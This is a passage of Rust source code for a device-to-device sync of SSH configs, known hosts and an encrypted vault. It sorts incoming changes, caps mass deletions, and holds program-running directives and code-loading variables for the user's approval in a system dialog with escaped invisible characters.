//! A sync between two of the user's devices, once each made sure the other
//! is one (see [`conversation`]).
//!
//! 1. Each sends its [`Manifest`]: hosts, their server keys, and the
//!    records of the user's devices, projects and contacts. The side that
//!    connected goes first. When both sync the vault's entries
//!    ([`Entries`]), each then sends its copy of the vault
//!    ([`Side::vault_copy`]) as bytes.
//! 2. Each works out on its own what to take ([`plan`], [`Side::vault_plan`])
//!    and sorts it:
//!    - changes nobody needs to look at;
//!    - changes that add a directive running a program or reaching beyond
//!      the host, or a variable that makes programs load code;
//!    - deletions past [`MASS_DELETE`] from that device in a day, hosts
//!      and the vault's items counted together, those made without asking
//!      before included;
//!    - conflicts.
//! 3. The user of the side that connected decides on all but the first
//!    kind; its choices on conflicts go to the other side
//!    ([`Message::Decisions`]). The other side puts off its own risky
//!    changes and mass deletions: its user is asked when they sync from it.
//!    A risky change the user chose, a conflict settled for the other
//!    computer's version included, is made only once they allow it in a
//!    system dialog ([`Side::allow_risky`], [`Side::allow_risky_variables`]),
//!    which a script in the page can't answer; what they don't allow waits
//!    for the next sync.
//! 4. Each writes its files and its vault (after a backup) and says what it
//!    has now ([`Message::Applied`]). What both have alike becomes the
//!    snapshot for next time ([`agree`], [`agree_hashed`]).
//!
//! [`conversation`]: super::pairing::conversation

use std::collections::{BTreeMap, BTreeSet};
use std::fmt::Write as _;
use std::net::TcpStream;
use std::time::Instant;

use serde::{Deserialize, Serialize};
use sshkm_core::config::SshConfig;
use sshkm_core::known_hosts::KnownHosts;
use sshkm_core::p2p::protocol::{EntrySync, VaultDecisions};
use sshkm_core::p2p::{Message, PeerKey, Session};
use sshkm_core::sync::host_keys::{self, KeysDiffer};
use sshkm_core::sync::hosts::{self, RiskyLine};
use sshkm_core::sync::{
    Base, Change, Conflict, Hasher, MAX_MANIFEST, Manifest, agree, agree_hashed, digest, digests,
    plan,
};
use sshkm_core::vault::envs::files::CloudService;
use sshkm_core::vault::projects::ProjectRecord;
use sshkm_core::vault::sync::{
    VaultBase, VaultChange, VaultChoices, VaultConflict, VaultCounts, VaultPlan,
};
use sshkm_core::vault::{ContactRecord, DeviceRecord, MAX_DATABASE_SIZE};
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use zeroize::Zeroizing;

use super::pairing::{
    ANSWER_TIMEOUT, Entries, POLL, PairingFailure, PairingPhase, Side, VaultItems, broken, waiting,
};
use super::transfer::STEP_TIMEOUT;
use crate::confirm::Localized;

/// More deletions than this from one device within [`DELETION_WINDOW`]
/// need the user's yes.
pub const MASS_DELETE: usize = 5;
/// Over how long deletions from one device are counted, in seconds.
const DELETION_WINDOW: i64 = 24 * 60 * 60;
/// Most directives the system dialog lists.
const SHOWN_LINES: usize = 8;
/// Longest value the system dialog shows in full.
const SHOWN_CHARS: usize = 120;

/// What a sync starts from on one side.
pub struct SyncLocal {
    pub config: SshConfig,
    pub known: KnownHosts,
    pub devices: Vec<DeviceRecord>,
    pub projects: Vec<ProjectRecord>,
    pub contacts: Vec<ContactRecord>,
    pub state: SyncState,
    pub hasher: Hasher,
}

/// What one computer keeps about its last sync with another device.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SyncState {
    pub base: Base,
    /// Risky changes this user said no to, by host: the digest of the
    /// version turned down, which is then not asked about again.
    #[serde(default)]
    pub declined: BTreeMap<String, String>,
    /// When the last sync ended: RFC 3339, UTC.
    #[serde(default)]
    pub synced: Option<String>,
    /// The vault's snapshot of the last sync, and the groups paired.
    #[serde(default)]
    pub vault: VaultBase,
    /// The vault's risky changes this user said no to, by item: the
    /// version turned down.
    #[serde(default)]
    pub vault_declined: BTreeMap<String, String>,
    /// Deletions this computer made from that device without asking: when
    /// (seconds since 1970) and how many. Those of the last
    /// [`DELETION_WINDOW`] count with a sync's own.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub unasked: Vec<(i64, u32)>,
}

impl SyncState {
    /// Deletions made from the device without asking in the
    /// [`DELETION_WINDOW`] before `now`; one dated after `now` (a clock set
    /// back) counts too.
    fn recent_unasked(&self, now: i64) -> usize {
        self.unasked
            .iter()
            .filter(|(when, _)| now - when < DELETION_WINDOW)
            .map(|(_, count)| usize::try_from(*count).unwrap_or(usize::MAX))
            .fold(0, usize::saturating_add)
    }

    /// Remembers `made` deletions made now without asking, and forgets
    /// those older than [`DELETION_WINDOW`].
    fn note_unasked(&mut self, now: i64, made: usize) {
        self.unasked
            .retain(|(when, _)| now - when < DELETION_WINDOW);
        if made > 0 {
            self.unasked.push((now, count(made)));
        }
    }
}

/// What a sync writes: the files that changed, checked against the
/// revisions they had when it started, and the other side's device,
/// project and contact records.
pub struct SyncWrite {
    pub config: Option<SshConfig>,
    pub config_revision: String,
    pub known: Option<KnownHosts>,
    pub known_revision: String,
    pub devices: Vec<DeviceRecord>,
    pub projects: Vec<ProjectRecord>,
    pub contacts: Vec<ContactRecord>,
    /// The config loses hosts: a kept backup goes first.
    pub deletes: bool,
}

/// What the user of the side that connected decides on.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
#[cfg_attr(test, derive(ts_rs::TS), ts(export, export_to = crate::types::BINDINGS))]
pub struct Review {
    /// Hosts both computers changed, differently.
    pub conflicts: Vec<Conflict>,
    /// Changes that add a directive running a program or reaching beyond
    /// the host.
    pub risky: Vec<RiskyChange>,
    /// Hosts the other computer deleted, when the deletions from it pass
    /// [`MASS_DELETE`] in a day.
    pub deletions: Vec<String>,
    /// The same for the vault's entries and groups.
    pub vault: VaultReview,
}

/// What the user decides on of the vault's entries and groups.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
#[cfg_attr(test, derive(ts_rs::TS), ts(export, export_to = crate::types::BINDINGS))]
pub struct VaultReview {
    /// Items both computers changed, differently, or one deleted and the
    /// other changed.
    pub conflicts: Vec<VaultConflict>,
    /// Changes that add or change a variable that makes programs load code.
    pub risky: Vec<VaultChange>,
    /// What leaves the vault or goes to the recycle bin, when the deletions
    /// from the other computer pass [`MASS_DELETE`] in a day.
    pub deletions: Vec<VaultChange>,
}

impl Review {
    fn is_empty(&self) -> bool {
        self.conflicts.is_empty()
            && self.risky.is_empty()
            && self.deletions.is_empty()
            && self.vault.conflicts.is_empty()
            && self.vault.risky.is_empty()
            && self.vault.deletions.is_empty()
    }
}

/// A risky change: the host and the directives it would add.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
#[cfg_attr(test, derive(ts_rs::TS), ts(export, export_to = crate::types::BINDINGS))]
pub struct RiskyChange {
    pub id: String,
    pub lines: Vec<RiskyLine>,
}

/// An environment's variables a sync adds or changes that make programs
/// load code, as the system dialog lists them.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RiskyVariables {
    /// The environment's entry id.
    pub id: String,
    /// The environment, for people: `Shop · backend · prod`.
    pub environment: String,
    pub names: Vec<String>,
}

/// The user's choices on a [`Review`]; what is in no list waits for the
/// next sync.
#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
#[cfg_attr(test, derive(ts_rs::TS), ts(export, export_to = crate::types::BINDINGS))]
pub struct SyncDecisions {
    /// Conflicts where this computer's version stays.
    #[serde(default)]
    pub mine: Vec<String>,
    /// Conflicts where the other computer's version stays.
    #[serde(default)]
    pub theirs: Vec<String>,
    /// Risky changes to make.
    #[serde(default)]
    pub apply: Vec<String>,
    /// Risky changes turned down: not asked about again.
    #[serde(default)]
    pub decline: Vec<String>,
    /// Make the deletions, hosts' and the vault's.
    #[serde(default)]
    pub delete: bool,
    /// The same as `mine`, `theirs`, `apply` and `decline` for the vault's
    /// entries and groups, by id.
    #[serde(default)]
    pub vault_mine: Vec<String>,
    #[serde(default)]
    pub vault_theirs: Vec<String>,
    #[serde(default)]
    pub vault_apply: Vec<String>,
    #[serde(default)]
    pub vault_decline: Vec<String>,
}

/// How a sync went on this side.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
#[cfg_attr(test, derive(ts_rs::TS), ts(export, export_to = crate::types::BINDINGS))]
pub struct SyncSummary {
    /// Hosts added, changed and deleted here.
    pub added: u32,
    pub changed: u32,
    pub removed: u32,
    /// Server keys added to `known_hosts` here.
    pub keys_added: u32,
    /// Hosts the two trust different keys for: shown, never resolved.
    pub keys_differ: Vec<KeysDiffer>,
    /// Changes put off for this computer's user, and for the other's.
    pub deferred: u32,
    pub deferred_there: u32,
    /// Conflicts left for a later sync.
    pub conflicts: u32,
    /// Changes `ssh_config` didn't take.
    pub failed: u32,
    /// What the vault took, by kind.
    pub vault: VaultCounts,
    /// Why the vault's entries didn't sync, when they didn't.
    pub vault_off: Option<VaultOff>,
}

/// Why the vault's entries didn't sync.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(tag = "type", rename_all = "camelCase")]
#[cfg_attr(test, derive(ts_rs::TS), ts(export, export_to = crate::types::BINDINGS))]
pub enum VaultOff {
    /// A vault is in a folder this cloud service keeps in step: this
    /// computer's (`here`) or the other's.
    Cloud { service: CloudService, here: bool },
    /// The other device's version doesn't sync them.
    Version,
}

impl VaultOff {
    /// Why entries don't sync, from what both sides said; `None` when they
    /// do, or this side doesn't either (its vault is locked).
    fn of(entries: Entries) -> Option<Self> {
        if EntrySync::agreed(entries.mine, entries.theirs).is_some() {
            return None;
        }
        match (entries.mine, entries.theirs) {
            (Some(EntrySync::Cloud { service }), _) => Some(Self::Cloud {
                service,
                here: true,
            }),
            (_, Some(EntrySync::Cloud { service })) => Some(Self::Cloud {
                service,
                here: false,
            }),
            (Some(EntrySync::On { .. }), _) => Some(Self::Version),
            _ => None,
        }
    }
}

/// The rest of the conversation on either side.
pub fn run(
    session: &mut Session<TcpStream>,
    side: &impl Side,
    peer: PeerKey,
    entries: Entries,
) -> PairingPhase {
    talk(session, side, peer, entries).unwrap_or_else(|reason| PairingPhase::Failed { reason })
}

/// What a plan holds, sorted by who has to look at it.
#[derive(Default)]
struct Sorted {
    safe: Vec<Change>,
    risky: Vec<(Change, Vec<RiskyLine>)>,
    deletions: Vec<Change>,
    conflicts: Vec<Conflict>,
    vault: VaultSorted,
    /// Deletions that go without asking: few enough today.
    unasked: usize,
}

/// The vault's part of [`Sorted`].
#[derive(Default)]
struct VaultSorted {
    safe: Vec<VaultChange>,
    risky: Vec<VaultChange>,
    removals: Vec<VaultChange>,
    conflicts: Vec<VaultConflict>,
}

fn talk(
    session: &mut Session<TcpStream>,
    side: &impl Side,
    peer: PeerKey,
    entries: Entries,
) -> Result<PairingPhase, PairingFailure> {
    let initiator = session.is_initiator();
    side.show(None, &PairingPhase::Syncing);
    let local = side.sync_load(peer)?;
    let (mine, theirs) = swap_manifests(session, &local)?;
    let vault = match EntrySync::agreed(entries.mine, entries.theirs) {
        Some(_) => Some(swap_vault(session, side, &local.state.vault)?),
        None => None,
    };

    let sorted = sort(
        &local,
        &plan(&local.state.base, &local.hasher, &mine.hosts, &theirs.hosts),
        vault.as_ref(),
    );
    let decisions = settle(session, side, &local.config, &sorted, vault.is_some())?;
    let mut summary = SyncSummary {
        vault_off: VaultOff::of(entries),
        ..SyncSummary::default()
    };
    let mut state = local.state.clone();
    let vault_choices = choose_vault(
        initiator,
        &sorted.vault,
        &decisions,
        &mut state,
        &mut summary,
    );
    state.note_unasked(OffsetDateTime::now_utc().unix_timestamp(), sorted.unasked);
    let changes = choose(
        initiator,
        &local.config,
        sorted,
        &decisions,
        &mut state,
        &mut summary,
    );
    let (config, known) = apply_hosts(&local, &changes, &theirs, &mut summary);
    let written = side.sync_write(
        peer,
        &SyncWrite {
            config: (config != local.config).then(|| config.clone()),
            config_revision: local.config.revision(),
            known: (known != local.known).then_some(known),
            known_revision: local.known.revision(),
            devices: theirs.devices.clone(),
            projects: theirs.projects.clone(),
            contacts: theirs.contacts.clone(),
            deletes: changes.iter().any(|c| matches!(c, Change::Delete(_))),
        },
    );
    let vault_written = vault.as_ref().map(|plan| {
        side.vault_apply(plan, &vault_choices)
            .map(|applied| summary.vault = applied.counts)
    });
    let vault_now = match &vault {
        Some(plan) => Some(side.vault_items(&plan.pairs)?),
        None => None,
    };
    // What is on disk now: the other side's snapshot must match it.
    let after = hosts::portable(if written.is_ok() {
        &config
    } else {
        &local.config
    });
    let Message::Applied {
        hashes: their_hashes,
        deferred: deferred_there,
        vault: their_vault,
    } = swap(
        session,
        &Message::Applied {
            hashes: digests(&after),
            deferred: summary.deferred,
            vault: vault_now
                .as_ref()
                .map(|now| now.digests.clone())
                .unwrap_or_default(),
        },
    )?
    else {
        return Err(PairingFailure::Broken);
    };
    written?;
    vault_written.transpose()?;
    summary.deferred_there = deferred_there;

    state.base = agree(&local.state.base, &local.hasher, &after, &their_hashes);
    if let (Some(plan), Some(now)) = (&vault, &vault_now) {
        remember_vault(&mut state, &local.state.vault, plan, now, &their_vault);
    }
    let offered = digests(&theirs.hosts);
    state
        .declined
        .retain(|id, declined| offered.get(id) == Some(declined));
    state.synced = OffsetDateTime::now_utc().format(&Rfc3339).ok();
    side.sync_keep(peer, &state)?;
    Ok(PairingPhase::Synced { summary })
}

/// Sends this side's manifest and reads the other's, checked.
fn swap_manifests(
    session: &mut Session<TcpStream>,
    local: &SyncLocal,
) -> Result<(Manifest, Manifest), PairingFailure> {
    let hosts = hosts::portable(&local.config);
    let mine = Manifest {
        host_keys: host_keys::collect(&local.known, &hosts),
        hosts,
        devices: local.devices.clone(),
        projects: local.projects.clone(),
        contacts: local.contacts.clone(),
    };
    let _ = session.stream().set_read_timeout(Some(STEP_TIMEOUT));
    let Message::Manifest { manifest: theirs } = swap(
        session,
        &Message::Manifest {
            manifest: mine.clone(),
        },
    )?
    else {
        return Err(PairingFailure::Broken);
    };
    theirs.check().map_err(|_| PairingFailure::Broken)?;
    Ok((mine, theirs))
}

/// The config and `known_hosts` after `changes` and the other side's
/// server keys, counted in `summary`.
fn apply_hosts(
    local: &SyncLocal,
    changes: &[Change],
    theirs: &Manifest,
    summary: &mut SyncSummary,
) -> (SshConfig, KnownHosts) {
    let mut config = local.config.clone();
    for change in changes {
        match (hosts::apply(&mut config, change), change) {
            (Ok(()), Change::Add(_)) => summary.added += 1,
            (Ok(()), Change::Update(_)) => summary.changed += 1,
            (Ok(()), Change::Delete(_)) => summary.removed += 1,
            (Err(_), _) => summary.failed += 1,
        }
    }
    let mut known = local.known.clone();
    let keys = host_keys::merge(&mut known, &theirs.host_keys);
    summary.keys_added = keys.added;
    summary.keys_differ = keys.differ;
    (config, known)
}

/// The vault's snapshot for next time: what both have alike, with the
/// groups paired; and the risky changes turned down that still come.
fn remember_vault(
    state: &mut SyncState,
    old: &VaultBase,
    plan: &VaultPlan,
    now: &VaultItems,
    theirs: &BTreeMap<String, String>,
) {
    state.vault = VaultBase {
        base: agree_hashed(&old.base, &now.snapshots, &now.digests, theirs),
        pairs: plan.pairs.clone(),
    };
    let offered: BTreeMap<&String, &String> =
        plan.changes.iter().map(|c| (&c.id, &c.version)).collect();
    state
        .vault_declined
        .retain(|id, declined| offered.get(id) == Some(&&*declined));
}

/// Sends this side's copy of the vault and reads the other's (the side
/// that connected first), then works out what to take from it.
fn swap_vault(
    session: &mut Session<TcpStream>,
    side: &impl Side,
    base: &VaultBase,
) -> Result<VaultPlan, PairingFailure> {
    let copy = side.vault_copy()?;
    let theirs = if session.is_initiator() {
        session.send_bytes(&copy, &mut |_, _| {}).map_err(broken)?;
        session
            .recv_bytes(MAX_DATABASE_SIZE, &mut |_, _| {})
            .map_err(broken)?
    } else {
        let theirs = session
            .recv_bytes(MAX_DATABASE_SIZE, &mut |_, _| {})
            .map_err(broken)?;
        session.send_bytes(&copy, &mut |_, _| {}).map_err(broken)?;
        theirs
    };
    side.vault_plan(&Zeroizing::new(theirs.to_vec()), base)
}

/// What the users decided: on the side that connected, its user's choices
/// on whatever needs one, less the risky ones they don't allow in the
/// system dialog, sent to the other side; there, what came.
fn settle(
    session: &mut Session<TcpStream>,
    side: &impl Side,
    config: &SshConfig,
    sorted: &Sorted,
    vault: bool,
) -> Result<SyncDecisions, PairingFailure> {
    if session.is_initiator() {
        let review = Review {
            conflicts: sorted.conflicts.clone(),
            risky: sorted
                .risky
                .iter()
                .map(|(change, lines)| RiskyChange {
                    id: change.id().to_owned(),
                    lines: lines.clone(),
                })
                .collect(),
            deletions: sorted.deletions.iter().map(|c| c.id().to_owned()).collect(),
            vault: VaultReview {
                conflicts: sorted.vault.conflicts.clone(),
                risky: sorted.vault.risky.clone(),
                deletions: sorted.vault.removals.clone(),
            },
        };
        let mut decisions = if review.is_empty() {
            SyncDecisions::default()
        } else {
            side.show(None, &PairingPhase::Decide { review });
            decide(session, side)?
        };
        allow_risky(side, config, sorted, &mut decisions);
        session
            .send(&Message::Decisions {
                initiator: decisions.mine.clone(),
                responder: decisions.theirs.clone(),
                vault: vault.then(|| VaultDecisions {
                    initiator: decisions.vault_mine.clone(),
                    responder: decisions.vault_theirs.clone(),
                }),
            })
            .map_err(|_| PairingFailure::Broken)?;
        side.show(None, &PairingPhase::Syncing);
        return Ok(decisions);
    }
    // The other user reviews, then may see the system dialog.
    let _ = session
        .stream()
        .set_read_timeout(Some(ANSWER_TIMEOUT * 2 + STEP_TIMEOUT));
    let Message::Decisions {
        initiator: theirs_stay,
        responder: mine_stay,
        vault,
    } = session.recv().map_err(broken)?
    else {
        return Err(PairingFailure::Broken);
    };
    let _ = session.stream().set_read_timeout(Some(STEP_TIMEOUT));
    let vault = vault.unwrap_or_default();
    Ok(SyncDecisions {
        mine: mine_stay,
        theirs: theirs_stay,
        vault_mine: vault.responder,
        vault_theirs: vault.initiator,
        ..SyncDecisions::default()
    })
}

/// Keeps in `decisions` only the risky changes this computer's user allows
/// in the system dialogs: the ones they chose to make, and the conflicts
/// they settled for the other computer's version that would add a directive
/// running a program or reaching beyond the host, or a variable that makes
/// programs load code. The page's choice alone never writes one. On a no,
/// all of them wait for the next sync; the rest of the sync goes on.
fn allow_risky(
    side: &impl Side,
    config: &SshConfig,
    sorted: &Sorted,
    decisions: &mut SyncDecisions,
) {
    let mut asked: Vec<RiskyChange> = sorted
        .risky
        .iter()
        .filter(|(change, _)| decisions.apply.iter().any(|id| id == change.id()))
        .map(|(change, lines)| RiskyChange {
            id: change.id().to_owned(),
            lines: lines.clone(),
        })
        .collect();
    for conflict in &sorted.conflicts {
        if !decisions.theirs.contains(&conflict.id) {
            continue;
        }
        let lines = hosts::risky(config, &conflict.take_theirs()).unwrap_or_default();
        if !lines.is_empty() {
            asked.push(RiskyChange {
                id: conflict.id.clone(),
                lines,
            });
        }
    }
    if !asked.is_empty() && !side.allow_risky(&asked) {
        let asked = |id: &String| asked.iter().any(|change| change.id == *id);
        decisions.apply.retain(|id| !asked(id));
        decisions.theirs.retain(|id| !asked(id));
    }

    let variables = |id: &str, environment: &str, names: &[String]| RiskyVariables {
        id: id.to_owned(),
        environment: environment.to_owned(),
        names: names.to_vec(),
    };
    let mut asked: Vec<RiskyVariables> = sorted
        .vault
        .risky
        .iter()
        .filter(|change| decisions.vault_apply.contains(&change.id))
        .map(|change| variables(&change.id, &change.label, &change.risky))
        .collect();
    asked.extend(
        sorted
            .vault
            .conflicts
            .iter()
            .filter(|c| !c.risky.is_empty() && decisions.vault_theirs.contains(&c.id))
            .map(|c| variables(&c.id, &c.label, &c.risky)),
    );
    if !asked.is_empty() && !side.allow_risky_variables(&asked) {
        let asked = |id: &String| asked.iter().any(|change| change.id == *id);
        decisions.vault_apply.retain(|id| !asked(id));
        decisions.vault_theirs.retain(|id| !asked(id));
    }
}

/// The system dialog that asks to allow `changes` from a sync with `peer`
/// in the config file `file`: its title, text and button.
pub fn risky_prompt(
    peer: &str,
    file: &str,
    changes: &[RiskyChange],
) -> (Localized, Localized, Localized) {
    let en = risky_list(changes, |n| format!("…and {n} more"));
    let ru = risky_list(changes, |n| format!("…и ещё {n}"));
    let uz = risky_list(changes, |n| format!("…va yana {n} ta"));
    let peer = shown(peer);
    (
        Localized::new(
            "Allow ssh to run this?",
            "Разрешить ssh запускать это?",
            "ssh buni ishga tushirsinmi?",
        ),
        Localized::new(
            format!(
                "The sync with {peer} adds to {file} what makes ssh run programs, load code \
                 or let the server use this computer each time you connect:\n\n{en}\n\n\
                 Allow it only if you made these changes on {peer} yourself. Otherwise \
                 they wait for the next sync."
            ),
            format!(
                "Синхронизация с {peer} добавляет в {file} то, из-за чего ssh при каждом \
                 подключении запускает программы, загружает код или даёт серверу доступ к \
                 этому компьютеру:\n\n{ru}\n\n\
                 Разрешайте, только если эти изменения на {peer} сделали вы сами. Иначе \
                 они подождут следующей синхронизации."
            ),
            format!(
                "{peer} bilan sinxronlash {file} ga ssh har safar ulanganda dasturlarni \
                 ishga tushiradigan, kod yuklaydigan yoki serverga bu kompyuterdan \
                 foydalanishga ruxsat beradigan narsalarni qoʻshadi:\n\n{uz}\n\n\
                 Faqat bu oʻzgarishlarni {peer} da oʻzingiz qilgan boʻlsangiz, ruxsat \
                 bering. Aks holda ular keyingi sinxronlashni kutadi."
            ),
        ),
        Localized::new(
            "Allow and sync",
            "Разрешить и синхронизировать",
            "Ruxsat berish va sinxronlash",
        ),
    )
}

/// One line per directive (`• Host prod: ProxyCommand …`), at most
/// [`SHOWN_LINES`] of them; `more` says how many were left out.
fn risky_list(changes: &[RiskyChange], more: impl Fn(usize) -> String) -> String {
    let all: Vec<String> = changes
        .iter()
        .flat_map(|change| {
            change.lines.iter().map(move |line| {
                format!(
                    "• Host {}: {} {}",
                    shown(&change.id),
                    shown(&line.key),
                    shown(&line.value)
                )
            })
        })
        .collect();
    let mut lines: Vec<String> = all.iter().take(SHOWN_LINES).cloned().collect();
    if all.len() > SHOWN_LINES {
        lines.push(more(all.len() - SHOWN_LINES));
    }
    lines.join("\n")
}

/// The system dialog that asks to allow `changes` to environments from a
/// sync with `peer`: its title, text and button.
pub fn variables_prompt(
    peer: &str,
    changes: &[RiskyVariables],
) -> (Localized, Localized, Localized) {
    let list = |more: &dyn Fn(usize) -> String| {
        let all: Vec<String> = changes
            .iter()
            .map(|change| {
                let names: Vec<String> = change.names.iter().map(|n| shown(n)).collect();
                format!("• {}: {}", shown(&change.environment), names.join(", "))
            })
            .collect();
        let mut lines: Vec<String> = all.iter().take(SHOWN_LINES).cloned().collect();
        if all.len() > SHOWN_LINES {
            lines.push(more(all.len() - SHOWN_LINES));
        }
        lines.join("\n")
    };
    let en = list(&|n| format!("…and {n} more"));
    let ru = list(&|n| format!("…и ещё {n}"));
    let uz = list(&|n| format!("…va yana {n} ta"));
    let peer = shown(peer);
    (
        Localized::new(
            "Allow variables that run code?",
            "Разрешить переменные, которые запускают код?",
            "Kod ishga tushiradigan oʻzgaruvchilarga ruxsat berilsinmi?",
        ),
        Localized::new(
            format!(
                "The sync with {peer} adds or changes variables that make programs load \
                 code or run commands when you use the environment in a terminal or a \
                 .env file:\n\n{en}\n\nAllow it only if you made these changes on {peer} \
                 yourself. Otherwise they wait for the next sync."
            ),
            format!(
                "Синхронизация с {peer} добавляет или меняет переменные, из-за которых \
                 программы загружают код или запускают команды, когда вы используете \
                 окружение в терминале или в файле .env:\n\n{ru}\n\nРазрешайте, только \
                 если эти изменения на {peer} сделали вы сами. Иначе они подождут следующей \
                 синхронизации."
            ),
            format!(
                "{peer} bilan sinxronlash muhitni terminalda yoki .env faylida \
                 ishlatganingizda dasturlarga kod yuklatadigan yoki buyruq ishga \
                 tushiradigan oʻzgaruvchilarni qoʻshadi yoki oʻzgartiradi:\n\n{uz}\n\n\
                 Faqat bu oʻzgarishlarni {peer} da oʻzingiz qilgan boʻlsangiz, ruxsat \
                 bering. Aks holda ular keyingi sinxronlashni kutadi."
            ),
        ),
        Localized::new(
            "Allow and sync",
            "Разрешить и синхронизировать",
            "Ruxsat berish va sinxronlash",
        ),
    )
}

/// `text` as the dialog shows it: control characters and invisible or
/// direction-changing ones as `<U+…>`, so what is shown is what `ssh` runs,
/// and at most [`SHOWN_CHARS`] characters, with how many more there are.
fn shown(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for (i, c) in text.chars().enumerate() {
        if i == SHOWN_CHARS {
            let rest = text.chars().count() - SHOWN_CHARS;
            let _ = write!(out, "… (+{rest})");
            break;
        }
        let invisible = matches!(
            c,
            '\u{00AD}'
                | '\u{061C}'
                | '\u{180E}'
                | '\u{200B}'..='\u{200F}'
                | '\u{202A}'..='\u{202E}'
                | '\u{2060}'..='\u{2069}'
                | '\u{FEFF}'
        );
        if c.is_control() || invisible {
            let _ = write!(out, "<U+{:04X}>", u32::from(c));
        } else {
            out.push(c);
        }
    }
    out
}

/// The changes to make here after the decisions, counting what waits in
/// `summary` and remembering what the user turned down in `state`.
fn choose(
    initiator: bool,
    config: &SshConfig,
    sorted: Sorted,
    decisions: &SyncDecisions,
    state: &mut SyncState,
    summary: &mut SyncSummary,
) -> Vec<Change> {
    let mut changes = sorted.safe;
    if initiator {
        for (change, _) in sorted.risky {
            let id = change.id().to_owned();
            if decisions.apply.contains(&id) {
                changes.push(change);
            } else if decisions.decline.contains(&id)
                && let Change::Add(item) | Change::Update(item) = &change
            {
                state.declined.insert(id, digest(item));
            } else {
                summary.deferred += 1;
            }
        }
        if decisions.delete {
            changes.extend(sorted.deletions);
        } else {
            summary.deferred += count(sorted.deletions.len());
        }
    } else {
        summary.deferred += count(sorted.risky.len() + sorted.deletions.len());
    }
    for conflict in &sorted.conflicts {
        if decisions.theirs.contains(&conflict.id) {
            let change = conflict.take_theirs();
            let risky = !hosts::risky(config, &change).unwrap_or_default().is_empty();
            if !initiator && risky {
                summary.deferred += 1;
            } else {
                changes.push(change);
            }
        } else if !decisions.mine.contains(&conflict.id) {
            summary.conflicts += 1;
        }
    }
    changes
}

/// The vault's changes to make here and how its conflicts are settled, as
/// [`choose`] does for hosts.
fn choose_vault(
    initiator: bool,
    sorted: &VaultSorted,
    decisions: &SyncDecisions,
    state: &mut SyncState,
    summary: &mut SyncSummary,
) -> VaultChoices {
    let mut make: BTreeSet<String> = sorted.safe.iter().map(|c| c.id.clone()).collect();
    if initiator {
        for change in &sorted.risky {
            if decisions.vault_apply.contains(&change.id) {
                make.insert(change.id.clone());
            } else if decisions.vault_decline.contains(&change.id) {
                state
                    .vault_declined
                    .insert(change.id.clone(), change.version.clone());
            } else {
                summary.deferred += 1;
            }
        }
        if decisions.delete {
            make.extend(sorted.removals.iter().map(|c| c.id.clone()));
        } else {
            summary.deferred += count(sorted.removals.len());
        }
    } else {
        summary.deferred += count(sorted.risky.len() + sorted.removals.len());
    }
    let (mut theirs, mut kept) = (BTreeSet::new(), BTreeSet::new());
    for conflict in &sorted.conflicts {
        if decisions.vault_theirs.contains(&conflict.id) {
            if !initiator && !conflict.risky.is_empty() {
                summary.deferred += 1;
            } else {
                theirs.insert(conflict.id.clone());
            }
        } else if decisions.vault_mine.contains(&conflict.id) {
            // The other side's version goes among the entry's earlier ones.
            kept.insert(conflict.id.clone());
        } else {
            summary.conflicts += 1;
        }
    }
    VaultChoices { make, theirs, kept }
}

/// Sends `message` and reads the other side's: the side that connected
/// sends first.
fn swap(session: &mut Session<TcpStream>, message: &Message) -> Result<Message, PairingFailure> {
    if session.is_initiator() {
        session.send_large(message).map_err(broken)?;
        session.recv_large(MAX_MANIFEST).map_err(broken)
    } else {
        let theirs = session.recv_large(MAX_MANIFEST).map_err(broken)?;
        session.send_large(message).map_err(broken)?;
        Ok(theirs)
    }
}

/// Sorts a plan's changes by who has to look at them; a risky change the
/// user turned down before, in the same version, is left out. Deletions
/// from a device are limited over time, not per sync: they need a look
/// when, with those made from it without asking in the last
/// [`DELETION_WINDOW`], they pass [`MASS_DELETE`], hosts and the vault's
/// items counted together.
fn sort(local: &SyncLocal, plan: &sshkm_core::sync::Plan, vault: Option<&VaultPlan>) -> Sorted {
    let mut sorted = Sorted {
        conflicts: plan.conflicts.clone(),
        ..Sorted::default()
    };
    for change in &plan.changes {
        if let Change::Add(item) | Change::Update(item) = change
            && local.state.declined.get(&item.id) == Some(&digest(item))
        {
            continue;
        }
        match hosts::risky(&local.config, change) {
            Ok(lines) if !lines.is_empty() => sorted.risky.push((change.clone(), lines)),
            _ if matches!(change, Change::Delete(_)) => sorted.deletions.push(change.clone()),
            _ => sorted.safe.push(change.clone()),
        }
    }
    if let Some(vault) = vault {
        sorted.vault.conflicts.clone_from(&vault.conflicts);
        for change in &vault.changes {
            if local.state.vault_declined.get(&change.id) == Some(&change.version) {
                continue;
            }
            if !change.risky.is_empty() {
                sorted.vault.risky.push(change.clone());
            } else if change.removal {
                sorted.vault.removals.push(change.clone());
            } else {
                sorted.vault.safe.push(change.clone());
            }
        }
    }
    let now = OffsetDateTime::now_utc().unix_timestamp();
    let incoming = sorted.deletions.len() + sorted.vault.removals.len();
    if local.state.recent_unasked(now) + incoming <= MASS_DELETE {
        sorted.unasked = incoming;
        sorted.safe.append(&mut sorted.deletions);
        sorted.vault.safe.append(&mut sorted.vault.removals);
    }
    sorted
}

/// Waits for the user's decisions while watching the connection; after
/// [`ANSWER_TIMEOUT`] everything waits for the next sync.
fn decide(
    session: &mut Session<TcpStream>,
    side: &impl Side,
) -> Result<SyncDecisions, PairingFailure> {
    let started = Instant::now();
    loop {
        if let Some(decisions) = side.decisions(POLL)? {
            return Ok(decisions);
        }
        if waiting(session.stream()).map_err(|_| PairingFailure::Broken)? {
            // The other side says nothing until it has the decisions:
            // anything now is it hanging up.
            return Err(PairingFailure::PeerLeft);
        }
        if started.elapsed() > ANSWER_TIMEOUT {
            return Ok(SyncDecisions::default());
        }
